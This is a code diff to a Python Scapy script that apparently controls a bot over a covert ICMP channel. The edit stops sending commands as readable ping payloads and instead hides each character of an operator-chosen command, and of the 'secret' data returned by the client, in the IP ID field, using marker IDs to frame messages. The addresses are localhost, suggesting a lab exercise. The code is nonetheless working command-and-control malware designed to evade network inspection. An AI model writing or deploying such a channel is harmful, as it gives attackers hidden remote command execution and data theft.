@@ -11,25 +11,35 @@ destIP = 'localhost'
 srcIP = 'localhost'
 interface = '\\Device\\NPF_Loopback'
 
+secretMessage = ''
+
 def sendSecretPing():
-    packet = IP(dst=destIP, src=srcIP) / ICMP(type=8) / (b"getsecret")
+    packet = IP(dst=destIP, src=srcIP, id = 65535) / ICMP(type=8)
     send(packet)
 
 
 def sendCommandPing(command):
-    data = "command" + command
-    packet = IP(dst=destIP, src=srcIP) / ICMP(type=8) / (data.encode())
+    packet = IP(dst=destIP, src=srcIP, id=65534) / ICMP(type=8)
+    send(packet)
+
+    for char in [*command]:
+        time.sleep(0.1)
+        send(IP(dst=destIP, src=srcIP, id=ord(char)|0x8000) / ICMP(type=8))
+
+    packet = IP(dst=destIP, src=srcIP, id=65533) / ICMP(type=8)
     send(packet)
 
 
 def processPacket(packet):
+    global secretMessage
     if packet[ICMP].type == 0:
-        if Raw in packet:
-            if "botreply" in packet[Raw].load.decode():
-                #packet.show()
-                data = packet[Raw].load.decode()[8:]
-                packet.show()
-                print(data)
+        if packet[IP].id & 0x8000 == 0x8000:
+            char = chr(packet[IP].id & 0x7FFF)
+            secretMessage += char
+            packet.summary()
+            print(secretMessage)
+        else:
+            secretMessage = ''
 
 
 
@@ -49,4 +59,5 @@ if __name__ == '__main__':
         elif command == '!command':
             command = input("What command should the client run?: \n")
             sendCommandPing(command)
+            secretMessage = ''
 
